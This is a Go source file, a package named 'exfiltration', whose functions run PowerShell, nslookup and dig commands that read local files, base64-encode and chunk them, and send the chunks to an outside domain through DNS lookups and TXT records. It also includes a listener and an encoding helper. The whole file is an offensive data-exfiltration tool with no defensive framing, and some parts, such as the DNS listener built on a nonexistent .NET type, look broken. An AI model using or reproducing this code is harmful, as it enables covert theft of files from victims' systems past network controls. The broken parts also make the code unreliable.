package exfiltration

import (
	"fmt"
	"os/exec"
)

func DNSExfilPowerCloud(targetDomain, dataFile string) (string, error) {
	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf(`$data=[Convert]::ToBase64String([IO.File]::ReadAllBytes('%s'));$chunks=$data-replace'(.{50})','$1.'-replace'.$','';Resolve-DnsName -Name "$chunks.%s" -Type TXT`, dataFile, targetDomain))
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func DNSExfilNslookup(data, dnsServer string) (string, error) {
	cmd := exec.Command("nslookup", "-type=TXT", data, dnsServer)
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func DNSExfilDig(data, dnsServer string) (string, error) {
	cmd := exec.Command("dig", data, dnsServer, "TXT")
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func DNSExfilTXTRecord(domain, dataFile string) (string, error) {
	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf(`$data=[Convert]::ToBase64String([IO.File]::ReadAllBytes('%s'));Add-DnsServerResourceRecord -ZoneName '%s' -Name 'exfil' -Txt -Value $data`, dataFile, domain))
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func DNSExfilTunnel(dataFile, dnsDomain string) (string, error) {
	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf(`$data=[Convert]::ToBase64String([IO.File]::ReadAllBytes('%s'));$chunks=$data-replace'(.{30})','$1.';foreach($c in ($chunks-split'\.')){nslookup $c'.%s'}`, dataFile, dnsDomain))
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func DNSExfilListener(interfaceName, dnsDomain string) (string, error) {
	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf(`$server=New-Object Net.DnsServer;$server.Domain='%s';$server.Interface='%s';$server.Start()`, dnsDomain, interfaceName))
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func DNSEncodeData(inputFile, outputTXT string) (string, error) {
	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf(`$data=[Convert]::ToBase64String([IO.File]::ReadAllBytes('%s'));[IO.File]::WriteAllText('%s',($data-replace'(.{50})','$1.'))`, inputFile, outputTXT))
	out, err := cmd.CombinedOutput()
	return string(out), err
}
